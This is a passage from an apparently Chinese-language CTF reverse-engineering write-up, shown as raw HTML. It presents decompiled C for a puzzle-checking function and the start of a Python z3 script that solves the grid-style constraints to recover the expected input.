class="hljs-number">5</span> );<br>  <span class="hljs-keyword">return</span> v6 &amp; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>fill_number的主要逻辑是5位5位取数以后，按给定的逻辑给各位的值减去48，但是由于题目没有给出输入的数，所以需要根据输出的值判定一开始的值，所以接着看check函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">docheck</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1; <span class="hljs-comment">// [rsp+2Eh] [rbp-9Ah]</span><br>  __int64 v2; <span class="hljs-comment">// [rsp+30h] [rbp-98h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+40h] [rbp-88h]</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+50h] [rbp-78h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+58h] [rbp-70h]</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+68h] [rbp-60h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+70h] [rbp-58h]</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [rsp+7Fh] [rbp-49h]</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [rsp+88h] [rbp-40h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+90h] [rbp-38h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+98h] [rbp-30h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+A8h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+BCh] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">char</span> v14[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+C2h] [rbp-6h] BYREF</span><br><br>  v12 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v10 = v12;<br>    <span class="hljs-built_in">memset</span>(v14, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v14));<br>    v9 = &amp;v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12]];<br>    <span class="hljs-keyword">if</span> ( *v9<br>      || (*v9 = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">1</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">1</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">2</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">2</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">3</span>]])<br>      || (v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">3</span>]] = <span class="hljs-number">1</span>, v14[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v12 + <span class="hljs-number">4</span>]]) )<br>    &#123;<br>      v8 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>    &#125;<br>    ++v12;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v10 + <span class="hljs-number">1</span> &lt; <span class="hljs-number">5</span> );<br>  v11 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v7 = v11;<br>    <span class="hljs-built_in">memset</span>(v13, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v13));<br>    v6 = &amp;v13[(<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[v11]];<br>    <span class="hljs-keyword">if</span> ( *v6 )<br>      <span class="hljs-keyword">break</span>;<br>    *v6 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_405055[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_405055[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505A[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505A[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505F[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    v13[(<span class="hljs-type">unsigned</span> __int8)byte_40505F[v11]] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v13[(<span class="hljs-type">unsigned</span> __int8)byte_405064[v11]] )<br>      <span class="hljs-keyword">break</span>;<br>    ++v11;<br>    <span class="hljs-keyword">if</span> ( v7 + <span class="hljs-number">1</span> &gt;= <span class="hljs-number">5</span> )<br>    &#123;<br>      v5 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        v4 = v5;<br>        <span class="hljs-keyword">if</span> ( row[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( row[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] )<br>        &#123;<br>LABEL_27:<br>          v8 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405071[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405071[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405072[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405072[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405073[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">4</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405073[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">4</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        ++v5;<br>        <span class="hljs-keyword">if</span> ( v4 + <span class="hljs-number">1</span> &gt;= <span class="hljs-number">5</span> )<br>        &#123;<br>          v3 = <span class="hljs-number">0LL</span>;<br>          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>          &#123;<br>            v2 = v3 + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> ( col[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( col[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2] )<br>              &#123;<br>LABEL_26:<br>                v8 = v1;<br>                <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405091[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">1</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">1</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405091[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">1</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">1</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405092[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">2</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">2</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405092[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">2</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">2</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405093[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">3</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">3</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405093[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">3</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">3</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405094[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">4</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405094[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">4</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            ++v3;<br>            v1 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> ( v2 &gt;= <span class="hljs-number">4</span> )<br>              <span class="hljs-keyword">goto</span> LABEL_26;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里值得说的就是这个使用goto LABEL实现的(个人认为是)for循环的if结构的语句，按照程序逻辑是一个求多元方程的过程，所以选择了python的z3库来解决，根据前面分析的逻辑逆向求解即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>zy=[<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>]<br>sx=[<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>]<br>ts = Solver()<br><span class="hljs-built_in">map</span> = [BitVec(<span class="hljs-string">&#x27;s%d&#x27;</span> % i, <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>)]<br>ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span>*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>] == <span class="hljs-number">4</span>)<br>ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span>*<span class="hljs-number">3</span>+<span class="hljs-number">3</span>] == <span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>    ts.add(i &gt; <span class="hljs-number">0</span>)<br>    ts.add(i &lt;= <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ts.add(<br>    And(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>]))<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ts.add(<br>    And(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b]<br>        ))<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br> <span class="hljs-keyword">for</span> y <span 